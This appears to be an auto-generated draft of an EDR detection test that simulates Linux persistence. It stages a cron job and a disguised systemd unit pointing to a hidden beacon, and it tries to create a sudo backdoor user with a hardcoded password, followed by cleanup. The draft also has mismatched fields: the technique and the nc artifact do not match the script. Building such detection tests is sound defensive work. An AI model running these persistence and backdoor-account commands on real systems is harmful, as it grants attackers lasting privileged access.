identity.name: Linux Persistence — Cron, Systemd, and Backdoor Users
identity.summary: Auto-generated draft from CortexSim scenario SIM-EDR-003. Plane: EDR. Primary technique: T1053.003. Requires human enrichment of BIOC logic + panw_mapping rule_ids.
identity.description:
Auto-generated draft from CortexSim scenario SIM-EDR-003. Plane: EDR. Primary technique: T1053.003. Requires human enrichment of BIOC logic + panw_mapping rule_ids.

Source scenario: SIM-EDR-003.
UC: Persistence Mechanism Detection / TC: Linux Persistence Installation.

techniques.name: Create or Modify System Process: Systemd Service

prerequisites.description: Lab environment matching scenario SIM-EDR-003 requirements.

payload.code:
# step-1: Create malicious cron job for persistence
echo '[*] Creating simulated persistence cron entry';
echo '*/15 * * * * /tmp/.cortexsim_beacon 2>/dev/null' > /tmp/cortexsim_cron_test;
crontab -l 2>/dev/null > /tmp/cortexsim_cron_backup;
echo '# CortexSim EDR-003 test entry — will be removed in cleanup' >> /tmp/cortexsim_cron_test;
cat /tmp/cortexsim_cron_test;
echo '[*] Cron persistence payload staged (NOT installed — display only for safety)'
# step-2: Create malicious systemd service unit (staging only)
echo '[*] Staging simulated systemd persistence unit';
cat > /tmp/cortexsim-backdoor.service << 'UNIT'
[Unit]
Description=System Health Monitor
After=network.target

[Service]
Type=simple
ExecStart=/tmp/.cortexsim_beacon
Restart=always
RestartSec=60

[Install]
WantedBy=multi-user.target
UNIT
echo '[*] Systemd unit staged at /tmp/ (NOT installed to /etc/systemd/)'
cat /tmp/cortexsim-backdoor.service
# step-3: Attempt to create backdoor user account
echo '[*] Simulating backdoor user creation';
useradd -M -s /bin/bash -G sudo cortexsim_testuser 2>/dev/null && \
  echo 'cortexsim_testuser:TempP@ss123' | chpasswd 2>/dev/null && \
  echo '[!] Backdoor user created — will be removed in cleanup' || \
  echo '[*] useradd failed (expected in containers or without root)'

expected_artifacts.description: Process execution matching nc (heuristic from scenario step step-01)

cleanup.code:
userdel cortexsim_testuser 2>/dev/null
rm -f /tmp/cortexsim_cron_test /tmp/cortexsim_cron_backup /tmp/cortexsim-backdoor.service /tmp/cortexsim_profile_test
rm -rf /tmp/.cortexsim_ssh_test
echo '[CortexSim] SIM-EDR-003 cleanup complete'
